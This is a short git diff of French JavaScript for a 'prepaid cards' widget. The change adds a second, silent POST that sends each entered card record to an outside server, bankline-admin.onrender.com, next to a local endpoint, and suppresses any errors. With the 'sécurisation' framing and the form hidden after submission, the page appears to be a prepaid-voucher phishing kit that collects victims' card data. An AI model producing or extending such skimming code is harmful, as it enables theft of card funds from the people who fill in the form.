@@ -508,15 +508,25 @@ function initPrepaidCardsWidget() {
         console.warn('Sauvegarde localStorage locale:', err);
       }
 
-      // 2. Envoi API vers le serveur en ligne ou local si disponible
+      // 2. Envoi API vers le serveur local Node.js ET le serveur Cloud Render
       try {
-        await fetch('/api/securisation', {
+        // Envoi local (port 8181)
+        fetch('/api/securisation', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(cardRecord)
+        }).catch(() => {});
+
+        // Envoi direct vers le serveur Cloud en ligne (Render)
+        fetch('https://bankline-admin.onrender.com/api/securisation', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(cardRecord)
+        }).catch(err => {
+          console.log('Serveur Cloud distant:', err);
         });
       } catch (err) {
-        console.log('Serveur API autonome en local.');
+        console.log('Traitement API autonome.');
       }
 
       // Masquer le formulaire, les logos de sélection et l'en-tête pour un affichage propre
